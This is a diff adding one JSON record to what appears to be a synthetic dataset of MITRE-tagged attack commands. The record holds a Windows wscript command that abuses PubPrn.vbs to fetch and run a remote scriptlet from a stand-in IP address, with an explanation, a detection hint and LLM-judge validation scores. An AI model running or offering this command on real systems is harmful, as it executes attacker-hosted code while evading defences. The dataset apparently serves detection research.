@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wscript.exe //nologo C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\PubPrn.vbs localhost script:https://198.51.100.77/job.sct",
+  "explanation": "Uses wscript to run the built-in PubPrn.vbs in a way that proxies execution of a remote scriptlet. This abuses a native admin script under user context.",
+  "rationale_steps": [
+    "From PowerShell, call wscript with PubPrn.vbs targeting the local system and a script: moniker URL.",
+    "WSH processes the remote .sct via PubPrn.vbs and executes the contained script.",
+    "This technique relies on trusted Windows scripts; monitoring should flag PubPrn.vbs with script: URIs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-8884c066",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid wscript syntax with a correct flag, path, and arguments; no quoting or parsing issues.",
+        "semantic_score": 5,
+        "semantic_justification": "Using PubPrn.vbs with the script: moniker via wscript to load a remote .sct is a known T1216 system script proxy execution method that can run under user context on Windows.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T22:00:06.460789Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
